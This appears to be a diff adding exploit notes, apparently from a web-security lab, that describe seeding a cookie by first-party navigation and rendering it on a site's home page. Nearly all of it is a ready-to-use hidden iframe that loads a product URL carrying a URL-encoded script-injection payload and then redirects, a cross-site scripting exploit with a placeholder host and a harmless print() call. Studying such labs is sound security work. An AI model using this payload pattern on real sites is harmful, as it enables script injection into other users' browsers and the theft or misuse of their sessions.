@@ -1,0 +1,8 @@
+# Seed cookie via first-party navigation then render on home page
+# Use hidden iframe to navigate and set payload-bearing cookie
+
+# Example iframe pattern (replace HOST and payload)
+<iframe src="https://HOST/product?productId=1&%27%3E%3Cscript%3Eprint()%3C/script%3E"
+        style="width:0;height:0;border:0;visibility:hidden"
+        onload="if(!this.dataset.hit){this.dataset.hit=1;location.href='https://HOST/';}"></iframe>
+
